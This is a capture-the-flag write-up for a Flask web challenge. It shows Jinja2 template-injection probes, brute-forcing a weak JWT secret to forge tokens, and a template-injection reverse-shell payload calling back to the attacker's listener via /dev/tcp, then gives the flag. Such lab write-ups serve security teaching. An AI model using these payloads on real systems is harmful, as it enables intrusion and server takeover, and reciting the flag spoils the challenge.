# Drink from my Flask #1

### Category

Web

### Description

A friend of yours got into an argument with a flask developer. He tried handling it himself, but he somehow got his nose broken in the process... Can you put your hacker skills to good use and help him out?

You should probably be able to access the server hosting your target's last project, shouldn't you ? I heard is making a lost of programming mistakes...

> Deploy on [deploy.heroctf.fr](https://deploy.heroctf.fr/)

Format : **Hero{flag}**<br>
Author : **Log_s**

### Write up

The landing page looks like this:

```
Invalid operation

Example: /?op=substract&n1=5&n2=2
```

Trying the calculator with the example from the landing page:
```
Result: 3
```

If we try to access another page, `/admin` for example, we get the following error.

```plain
/admin was not found

Only routes / and /adminPage are available
```

We now know that only the `/` and `/adminPage` routes are available. We could also notice that the `/admin` route we tried to access is reflected on the page. The challenge's name is pretty obvious and we can guess that the website is running on Flask. Let's try a simple payload and access `/{{7*7}}`.

```plain
/49 was not found

Only routes / and /adminPage are available
```

It looks promising at first glance, but there seems to be a filter on the payload's length, since trying to access `/{{cycler.__init__.__globals__.os.popen('id').read()}}` (which is the shortest jinja2 RCE payload yet) returns this error:

```plain
Anormaly long payload
```

Let's move on to `/adminPage`.

```plain
Sorry but you can't access this page, you're a 'guest'
```

We can't access it, because we area 'guest'. Where does this role come from ? We were given a cookie when we first accessed the website. Let's try to decode it.

```plain
$ ./jwt_tool.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww"
...
Token header values:
[+] typ = "JWT"
[+] alg = "HS256"

Token payload values:
[+] role = "guest"
...
```

The role seems to be embeded in the jwt token. It's using the HS256 algorithm, which is symetric. If the key is week enough, we should be able to bruteforce it and forge our own tokens.

```plain
$ ./jwt_tool.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww" -C -d /usr/share/wordlists/rockyou.txt
...
[+] key is the CORRECT key!
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "key"
```

Great ! The key is `key`. Let's alter the token to get the admin role.

```plain
$ ./jwt_tool.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww" -T -S hs256 -p "key"
...
Token header values:
[1] typ = "JWT"
[2] alg = "HS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] role = "guest"
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of role is: guest
Please enter new value and hit ENTER
> admin
[1] role = "admin"
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
jwttool_e28e8fb52fea84deff777ba1bfde5b8a - Tampered token - HMAC Signing:
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.AVjKNp3JWkmYQdHzpEVpAU9pfGSiwJykT3lbWpQYhMY
```

If we replace the cookie with the new value and refresh the page, we get the following result:

```plain
Welcome admin !
```

That's not very helpful... But remember the message we got when our role was `guest`? It seemed like the role was reflected when it was refusing us access to the admin page. Let's try with a jinja2 payload.

```plain
$ ./jwt_tool.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww" -T -S hs256 -p "key"
...
Token header values:
[1] typ = "JWT"
[2] alg = "HS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] role = "guest"
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of role is: guest
Please enter new value and hit ENTER
> {{7*7}}
[1] role = "{{7*7}}"
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
jwttool_321f15016cb6bbb918660a5fa9f949b6 - Tampered token - HMAC Signing:
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3s3Kjd9fSJ9.z__5DxmRbygPH1em02OyYj1Zt0GUbIk_zRoQ2twuzU8
```

Refreshing the page with the new cookie gives us the following result:

```plain
Sorry but you can't access this page, you're a '49'
```

It works ! 

Let's switch the payload to a reverse shell payload and get a shell on the server (172.17.0.1 being my attacking machine's IP address).

```python
{{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/172.17.0.1/9999 0>&1\"').read() }}
```

Reloading the page and wait for our shell:

```plain
$ nc -nlvp 9999
Listening on 0.0.0.0 9999
Connection received on 172.17.0.2 51130
www-data@98c3f56a4ba1:~/app$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@98c3f56a4ba1:~/app$ ls
ls
app.py
flag.txt
www-data@98c3f56a4ba1:~/app$ cat flag.txt
cat flag.txt
Hero{sst1_fl4v0ur3d_c0Ok1e}
```

Congratz!

### Flag

```
Hero{sst1_fl4v0ur3d_c0Ok1e}
```
